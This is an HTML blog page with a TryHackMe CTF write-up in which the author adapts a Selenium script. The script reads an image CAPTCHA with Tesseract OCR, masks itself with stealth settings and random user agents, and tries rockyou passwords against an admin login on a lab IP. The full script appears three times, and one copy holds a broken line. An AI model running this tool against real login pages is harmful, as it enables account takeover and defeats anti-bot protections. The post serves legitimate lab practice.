@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CAPTCHApocolypse | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/captchapocolypse.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/captchapocolypse.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="CAPTCHApocolypse">
+<meta property="og:description" content="TryHackMe CTF — Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CAPTCHApocolypse">
+<meta name="twitter:description" content="TryHackMe CTF — Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">CAPTCHApocolypse</h1>
+    <div class="post-description">TryHackMe CTF. Can you guess the password of the admin user and log in to the dashboard? Note: Use the first 100 lines of rockyou.txt.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Let&rsquo;s rock (cue <em>Exit Light</em> by Metallica).</p>
+
+<p>Here&rsquo;s my plan of attack:</p>
+
+<p>Freshly armed with a custom Selenium CAPTCHA browser bypass tool Python script, I&rsquo;ll modify it to fit this Target IP.</p>
+
+<p>First, we&rsquo;ll need a few line items:</p>
+<ul>
+<li>The first 100 lines of <code>rockyou.txt</code></li>
+<li>Swap the first 100 lines into the custom Selenium tool script</li>
+<li>The Target IP</li>
+<li>Potential subdomain of Target IP where CAPTCHA to bypass lives</li>
+</ul>
+
+<p>Let&rsquo;s grab the first 100 <code>rockyou.txt</code> lines, and run a few scans.</p>
+
+<pre><code>head -n 100 /usr/share/wordlists/rockyou.txt &gt; top100.txt</code></pre>
+
+<p>With our freshly-created <code>top100.txt</code>, we&rsquo;ll make our first two mods to the custom script.</p>
+
+<p>The custom Selenium CAPTCHA Python Script we&rsquo;re modifying, Target IP already updated:</p>
+
+<pre><code>from selenium.webdriver.common.by import By
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium_stealth import stealth
+
+import time
+from fake_useragent import UserAgent
+from PIL import Image, ImageEnhance, ImageFilter
+import pytesseract
+import io
+import os
+
+# Create folder for saving CAPTCHA images
+os.makedirs("captchas", exist_ok=True)
+
+options = Options()
+ua = UserAgent()
+userAgent = ua.random
+options.add_argument('--no-sandbox')
+options.add_argument('--headless')
+options.add_argument("start-maximized")
+options.add_argument(f'user-agent={userAgent}')
+options.add_argument('--disable-dev-shm-usage')
+options.add_argument('--disable-cache')
+options.add_argument('--disable-gpu')
+
+options.binary_location = "/usr/bin/google-chrome"
+service = Service(executable_path='chromedriver-linux64/chromedriver')
+chrome = webdriver.Chrome(service=service, options=options)
+
+stealth(chrome,
+    languages=["en-US", "en"],
+    vendor="Google Inc.",
+    platform="Win32",
+    webgl_vendor="Intel Inc.",
+    renderer="Intel Iris OpenGL Engine",
+    fix_hairline=True,
+)
+
+# CONFIG
+ip = 'http://10.144.142.102'
+login_url = f'{ip}/index.php'
+dashboard_url = f'{ip}/dashboard.php'
+
+username = "admin"
+with open('rockyou.txt', 'r') as f:
+    passwords = [line.strip() for line in f]
+
+for password in passwords:
+    while True:
+        chrome.get(login_url)
+        time.sleep(1)
+
+        # Grab CSRF token
+        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")
+
+        # Get CAPTCHA image rendered in-browser
+        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
+        captcha_png = captcha_img_element.screenshot_as_png
+
+        # Preprocess image for OCR
+        image = Image.open(io.BytesIO(captcha_png)).convert("L")
+        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
+        image = image.filter(ImageFilter.SHARPEN)
+        image = ImageEnhance.Contrast(image).enhance(2.0)
+        image = image.point(lambda x: 0 if x &lt; 140 else 255, '1')
+
+        # OCR the CAPTCHA
+        captcha_text = pytesseract.image_to_string(
+            image,
+            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
+        ).strip().replace(" ", "").replace("\n", "").upper()
+
+        # Save the image for review
+        image.save(f"captchas/captcha_{password}_{captcha_text}.png")
+
+        if not captcha_text.isalnum() or len(captcha_text) != 5:
+            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
+            continue
+
+        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")
+
+        # Fill out and submit the form
+        chrome.find_element(By.NAME, "username").send_keys(username)
+        chrome.find_element(By.NAME, "password").send_keys(password)
+        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
+        chrome.find_element(By.TAG_NAME, "form").submit()
+
+        time.sleep(1)
+
+        print("=== HTML Output After Submit ===")
+        print(chrome.page_source)
+        print("================================")
+
+        if dashboard_url in chrome.current_url:
+            print(f"[+] Login successful with password: {password}")
+            try:
+                flag = chrome.find_element(By.TAG_NAME, "p").text
+                print(f"[+] {flag}")
+            except:
+                print("[!] Logged in, but no flag found.")
+            chrome.quit()
+            exit()
+        else:
+            print(f"[-] Failed login with: {password}")
+            break  # try next password
+
+chrome.quit()</code></pre>
+
+<p>We&rsquo;re now also swapping the highlighted line below with:</p>
+
+<pre><code>with open('top100.txt', 'r') as f:
+    passwords = [line.strip() for line in f]</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.39.50 AM.png" alt="script open file line highlighted for swap to top100.txt" style="max-width:100%;margin:2rem 0;">
+
+<p>Moving on.</p>
+
+<p>Let&rsquo;s quickly verify that <code>top100.txt</code> lives where we are summoning it from:</p>
+
+<pre><code>head -n 100 /usr/share/wordlists/rockyou.txt &gt; top100.txt</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.42.52 AM.png" alt="top100.txt created and confirmed present" style="max-width:100%;margin:2rem 0;">
+
+<p>Confirmed there.</p>
+
+<p>Our <strong>nmap</strong> scan is back:</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.43.27 AM.png" alt="nmap scan output showing open ports" style="max-width:100%;margin:2rem 0;">
+
+<p>The <strong>nmap</strong> clearly points us to <code>/login</code>. I&rsquo;ve already started the <code>gobuster</code> below. We&rsquo;ll let that run while we dive in.</p>
+
+<p>Here&rsquo;s the <strong>gobuster</strong> we likely won&rsquo;t need:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-u http://10.144.142.102</code></pre>
+
+<p>Let&rsquo;s visit our Target IP:<br>
+<code>http://10.144.142.102</code></p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.50.11 AM.png" alt="target IP login page with CAPTCHA visible" style="max-width:100%;margin:2rem 0;">
+
+<p>Goodness me.</p>
+
+<p>There are 3 different fields for the custom script to tackle vs the two contained in the present script.</p>
+
+<p>I need to dig in and inspect this page to find:</p>
+<ol>
+<li>The <code>name</code> and <code>id</code> attributes of all four elements</li>
+<li>How the <code>CAPTCHA</code> is rendered</li>
+</ol>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.54.44 AM.png" alt="browser dev tools inspecting login form HTML" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;ll expand the three <code>&lt;div class="mb-4"&gt;</code> next. Here&rsquo;s what we first gleaned from inspection:</p>
+
+<ul>
+<li><strong>CSRF token</strong>: <code>&lt;input id="csrf_token" name="csrf_token" type="hidden"&gt;</code></li>
+<li><strong>CAPTCHA</strong>: in a div with class <code>captcha-block</code></li>
+</ul>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.58.20 AM.png" alt="expanded div elements showing CAPTCHA block and form fields" style="max-width:100%;margin:2rem 0;">
+
+<p>CAPTCHApocolypse, indeed.</p>
+
+<p>I love a good challenge.</p>
+
+<p>Here&rsquo;s our full list of script update items:</p>
+
+<ul>
+<li><strong>CSRF token</strong>: <code>&lt;input id="csrf_token" name="csrf_token" type="hidden"&gt;</code></li>
+<li><strong>CAPTCHA</strong>: in a div with class <code>captcha-block</code></li>
+<li><strong>Username field</strong>: <code>name="username"</code></li>
+<li><strong>Password field</strong>: <code>name="password"</code></li>
+<li><strong>CAPTCHA is an image</strong>: <code>&lt;img src="captcha.php"&gt;</code> and not plain text in the DOM, which means the script needs reworked</li>
+<li><strong>CAPTCHA input</strong>: <code>name="captcha_input"</code></li>
+<li><strong>Login button uses JavaScript</strong>: <code>onclick="login()"</code> aka not a standard form submit</li>
+</ul>
+
+<p>The big hurdle is CAPTCHA not being an image. Our initial Selenium script uses Tesseract OCR to &ldquo;see&rdquo; an image-based CAPTCHA, but this is not an image. Selenium can&rsquo;t just &ldquo;see&rdquo; it like text from the DOM. However, our Selenium scripts CAN screenshot the image element and pass it to Tesseract OCR.</p>
+
+<p>Here&rsquo;s how we need to retool to bypass this CAPTCHA goblin:</p>
+
+<ol>
+<li>Selenium navigates to our Target IP login page</li>
+<li>Screenshot the <code>&lt;img&gt;</code> CAPTCHA element</li>
+<li>Run it through Tesseract OCR to extract the text</li>
+<li>Fill in username, password, OCR&rsquo;d CAPTCHA, click login</li>
+<li>Loop for each password</li>
+</ol>
+
+<p>No sweat. It can be done.</p>
+
+<p>My VM instance needs Pytesseract installed:</p>
+
+<pre><code>sudo apt install tesseract-ocr
+pip install pytesseract pillow</code></pre>
+
+<p>We&rsquo;re going to run our existing script as <a href="/scripts/CAPTCHA_goblin.py"><code>CAPTCHA_goblin.py</code></a> and see how it goes.</p>
+
+<p>To recap, here&rsquo;s the Selenium <code>CAPTCHA_goblin.py</code> script:</p>
+
+<pre><code>from selenium.webdriver.common.by import By
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium_stealth import stealth
+
+import time
+from fake_useragent import UserAgent
+from PIL import Image, ImageEnhance, ImageFilter
+import pytesseract
+import io
+import os
+
+# Create folder for saving CAPTCHA images
+os.makedirs("captchas", exist_ok=True)
+
+options = Options()
+ua = UserAgent()
+userAgent = ua.random
+options.add_argument('--no-sandbox')
+options.add_argument('--headless')
+options.add_argument("start-maximized")
+options.add_argument(f'user-agent={userAgent}')
+options.add_argument('--disable-dev-shm-usage')
+options.add_argument('--disable-cache')
+options.add_argument('--disable-gpu')
+
+options.binary_location = "/usr/bin/chromium"
+service = Service(executable_path='/usr/bin/chromedriver')linux64/chromedriver')
+chrome = webdriver.Chrome(service=service, options=options)
+
+stealth(chrome,
+    languages=["en-US", "en"],
+    vendor="Google Inc.",
+    platform="Win32",
+    webgl_vendor="Intel Inc.",
+    renderer="Intel Iris OpenGL Engine",
+    fix_hairline=True,
+)
+
+# CONFIG
+ip = 'http://10.144.142.102'
+login_url = f'{ip}/index.php'
+dashboard_url = f'{ip}/dashboard.php'
+
+username = "admin"
+with open('top100.txt', 'r') as f:
+    passwords = [line.strip() for line in f]
+
+for password in passwords:
+    while True:
+        chrome.get(login_url)
+        time.sleep(1)
+
+        # Grab CSRF token
+        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")
+
+        # Get CAPTCHA image rendered in-browser
+        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
+        captcha_png = captcha_img_element.screenshot_as_png
+
+        # Preprocess image for OCR
+        image = Image.open(io.BytesIO(captcha_png)).convert("L")
+        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
+        image = image.filter(ImageFilter.SHARPEN)
+        image = ImageEnhance.Contrast(image).enhance(2.0)
+        image = image.point(lambda x: 0 if x &lt; 140 else 255, '1')
+
+        # OCR the CAPTCHA
+        captcha_text = pytesseract.image_to_string(
+            image,
+            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
+        ).strip().replace(" ", "").replace("\n", "").upper()
+
+        # Save the image for review
+        image.save(f"captchas/captcha_{password}_{captcha_text}.png")
+
+        if not captcha_text.isalnum() or len(captcha_text) != 5:
+            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
+            continue
+
+        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")
+
+        # Fill out and submit the form
+        chrome.find_element(By.NAME, "username").send_keys(username)
+        chrome.find_element(By.NAME, "password").send_keys(password)
+        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
+        chrome.find_element(By.TAG_NAME, "form").submit()
+
+        time.sleep(1)
+
+        print("=== HTML Output After Submit ===")
+        print(chrome.page_source)
+        print("================================")
+
+        if dashboard_url in chrome.current_url:
+            print(f"[+] Login successful with password: {password}")
+            try:
+                flag = chrome.find_element(By.TAG_NAME, "p").text
+                print(f"[+] {flag}")
+            except:
+                print("[!] Logged in, but no flag found.")
+            chrome.quit()
+            exit()
+        else:
+            print(f"[-] Failed login with: {password}")
+            break  # try next password
+
+chrome.quit()</code></pre>
+
+<p>Not the worst result in the world:</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.13.26 AM.png" alt="script error output missing selenium-stealth and fake-useragent" style="max-width:100%;margin:2rem 0;">
+
+<p>This isn&rsquo;t a script issue. <code>selenium-stealth</code> and <code>fake-useragent</code> aren&rsquo;t packaged in <code>apt</code>.</p>
+
+<p><strong>Workaround</strong>:<br>
+<code>--break-system-packages</code> is the simplest bypass on Kali for this single-use install.</p>
+
+<pre><code>sudo apt install python3-selenium
+pip install selenium-stealth fake-useragent --break-system-packages</code></pre>
+
+<p>Successfully installed.</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.16.20 AM.png" alt="selenium-stealth and fake-useragent successfully installed" style="max-width:100%;margin:2rem 0;">
+
+<p>It&rsquo;s CAPTCHA_goblin time.</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.17.43 AM.png" alt="running CAPTCHA_goblin.py first attempt error" style="max-width:100%;margin:2rem 0;">
+
+<p>We are missing two things:</p>
+<ul>
+<li>chromedriver</li>
+<li><em>maybe</em> chrome</li>
+</ul>
+
+<p>Let&rsquo;s find out.</p>
+
+<pre><code>which google-chrome
+which chromium</code></pre>
+
+<p>Chromium confirmed to exist. Let&rsquo;s update its drivers.</p>
+
+<pre><code>sudo apt install chromium-driver</code></pre>
+
+<pre><code>which chromedriver</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.21.10 AM.png" alt="which chromedriver returning /usr/bin/chromedriver" style="max-width:100%;margin:2rem 0;">
+
+<p>Now all we need to update in <code>CAPTCHA_goblin.py</code> is this:</p>
+
+<pre><code>options.binary_location = "/usr/bin/chromium"
+service = Service(executable_path='/usr/bin/chromedriver')</code></pre>
+
+<p>These are the two lines we are replacing:</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.22.44 AM.png" alt="old binary_location and service lines in script highlighted" style="max-width:100%;margin:2rem 0;">
+
+<p>Updated script:</p>
+
+<pre><code>from selenium.webdriver.common.by import By
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium_stealth import stealth
+
+import time
+from fake_useragent import UserAgent
+from PIL import Image, ImageEnhance, ImageFilter
+import pytesseract
+import io
+import os
+
+# Create folder for saving CAPTCHA images
+os.makedirs("captchas", exist_ok=True)
+
+options = Options()
+ua = UserAgent()
+userAgent = ua.random
+options.add_argument('--no-sandbox')
+options.add_argument('--headless')
+options.add_argument("start-maximized")
+options.add_argument(f'user-agent={userAgent}')
+options.add_argument('--disable-dev-shm-usage')
+options.add_argument('--disable-cache')
+options.add_argument('--disable-gpu')
+
+options.binary_location = "/usr/bin/chromium"
+service = Service(executable_path='/usr/bin/chromedriver')
+chrome = webdriver.Chrome(service=service, options=options)
+
+stealth(chrome,
+    languages=["en-US", "en"],
+    vendor="Google Inc.",
+    platform="Win32",
+    webgl_vendor="Intel Inc.",
+    renderer="Intel Iris OpenGL Engine",
+    fix_hairline=True,
+)
+
+# CONFIG
+ip = 'http://10.144.142.102'
+login_url = f'{ip}/index.php'
+dashboard_url = f'{ip}/dashboard.php'
+
+username = "admin"
+with open('top100.txt', 'r') as f:
+    passwords = [line.strip() for line in f]
+
+for password in passwords:
+    while True:
+        chrome.get(login_url)
+        time.sleep(1)
+
+        # Grab CSRF token
+        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")
+
+        # Get CAPTCHA image rendered in-browser
+        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
+        captcha_png = captcha_img_element.screenshot_as_png
+
+        # Preprocess image for OCR
+        image = Image.open(io.BytesIO(captcha_png)).convert("L")
+        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
+        image = image.filter(ImageFilter.SHARPEN)
+        image = ImageEnhance.Contrast(image).enhance(2.0)
+        image = image.point(lambda x: 0 if x &lt; 140 else 255, '1')
+
+        # OCR the CAPTCHA
+        captcha_text = pytesseract.image_to_string(
+            image,
+            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
+        ).strip().replace(" ", "").replace("\n", "").upper()
+
+        # Save the image for review
+        image.save(f"captchas/captcha_{password}_{captcha_text}.png")
+
+        if not captcha_text.isalnum() or len(captcha_text) != 5:
+            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
+            continue
+
+        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")
+
+        # Fill out and submit the form
+        chrome.find_element(By.NAME, "username").send_keys(username)
+        chrome.find_element(By.NAME, "password").send_keys(password)
+        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
+        chrome.find_element(By.ID, "login-btn").click()
+
+        time.sleep(1)
+
+        if dashboard_url in chrome.current_url:
+            print(f"[+] Login successful with password: {password}")
+            try:
+                flag = chrome.find_element(By.TAG_NAME, "p").text
+                print(f"[+] {flag}")
+            except:
+                print("[!] Logged in, but no flag found.")
+            chrome.quit()
+            exit()
+        elif "CAPTCHA incorrect" in chrome.page_source:
+            print(f"[!] CAPTCHA wrong (got '{captcha_text}'), retrying same password")
+            continue
+        else:
+            print(f"[-] Failed login with: {password}")
+            break
+
+chrome.quit()</code></pre>
+
+<p>ITS ALIVE:</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.25.19 AM.png" alt="CAPTCHA_goblin.py running and iterating through passwords" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;ll let it iterate through the CAPTCHA&hellip;</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.25.59 AM.png" alt="script iterating with password attempts and CAPTCHA reads" style="max-width:100%;margin:2rem 0;">
+
+<p>We have one tiny fix left. The login button uses JavaScript.<br>
+Now that we know the script iterates and is supported by the OS with what it needs, we can modify this line:</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.28.36 AM.png" alt="form submit line highlighted for replacement with click" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;ll change it to this:</p>
+
+<pre><code>chrome.find_element(By.ID, "login-btn").click()</code></pre>
+
+<p>If this final edit works, we&rsquo;ll tone down the noise by removing:</p>
+
+<pre><code>print("=== HTML Output After Submit ===")
+print(chrome.page_source)
+print("================================")</code></pre>
+
+<p>For now, we may need the &ldquo;noise&rdquo; to debug.</p>
+
+<p>Here we go again:</p>
+
+<pre><code>$ python3 CAPTCHA_goblin.py</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.31.48 AM.png" alt="script running with form correctly submitting and responses visible" style="max-width:100%;margin:2rem 0;">
+
+<p>It&rsquo;s now running and the form is correctly submitting.<br>
+Those are actual responses.</p>
+
+<p>Let&rsquo;s see what the CAPTCHA actually says so we know what the OCR is receiving:</p>
+
+<pre><code>ls captchas/ | head -5</code></pre>
+
+<p>And look at one with our human eyes:</p>
+
+<pre><code>xdg-open captchas/captcha_123123_S8UAS.png</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.36.50 AM.png" alt="captchas directory listing showing saved CAPTCHA images" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.36.29 AM.png" alt="CAPTCHA image opened showing distorted text" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re so close.</p>
+
+<p>The <code>CAPTCHA incorrect</code> error we&rsquo;re seeing post-submission should retry the same password with a fresh CAPTCHA each iteration.</p>
+
+<p>We just need the script to not handle CAPTCHA and password failures the same way.</p>
+
+<p>We&rsquo;ll replace this last part of the script&hellip;</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.46.19 AM.png" alt="old else block treating CAPTCHA wrong and wrong password identically" style="max-width:100%;margin:2rem 0;">
+
+<p>&hellip;with this:</p>
+
+<pre><code>elif "CAPTCHA incorrect" in chrome.page_source:
+    print(f"[!] CAPTCHA wrong (got '{captcha_text}'), retrying same password")
+    continue  # retry same password with fresh CAPTCHA
+else:
+    print(f"[-] Failed login with: {password}")
+    break  # actual wrong password, try next</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.53.12 AM.png" alt="updated script with CAPTCHA retry logic in place" style="max-width:100%;margin:2rem 0;">
+
+<p>So clean.</p>
+
+<p>How do we know it&rsquo;s working correctly?</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.54.21 AM.png" alt="princess password attempted 3 times with different CAPTCHAs then moved on" style="max-width:100%;margin:2rem 0;">
+
+<p>In the above screenshot, <code>princess</code> had 3 attempts with different CAPTCHAs until one was right. <code>CAPTCHA_goblin</code> then confirmed the actual password was wrong and moved on.</p>
+
+<p>That&rsquo;s exactly how the script should behave. Good boy.</p>
+
+<p>Now, we just let it run through the rest of <code>rockyou.txt</code> first 100&hellip;</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.57.38 AM.png" alt="script finds successful login and flag captured" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, well. Would you look at that.</p>
+
+<p>Good job, Jenn.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
